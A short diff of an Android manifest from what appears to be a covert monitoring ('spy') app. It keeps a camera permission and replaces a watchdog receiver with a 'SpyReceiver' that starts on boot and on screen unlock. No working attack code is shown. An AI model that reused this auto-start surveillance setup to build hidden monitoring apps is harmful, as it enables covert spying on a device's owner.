@@ -18,10 +18,9 @@
 	<uses-permission android:name="android.permission.CAMERA" />
 
 	<application android:label="@string/application_name" android:theme="@style/Default" android:clearTaskOnLaunch="true">
-		<activity android:name=".ConfiguratingActivity" android:label="@string/application_name" />
 		<service android:name="org.ddth.android.monitor.AndroidWatchdogService" />
-		<receiver android:name="org.ddth.android.monitor.AndroidBroadcastReceiver">
-			<meta-data android:name="watchdog" android:value="org.ddth.android.spy.SpyWatcher" />
+		<activity android:name=".ConfiguratingActivity" android:label="@string/application_name" />
+		<receiver android:name=".SpyReceiver">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
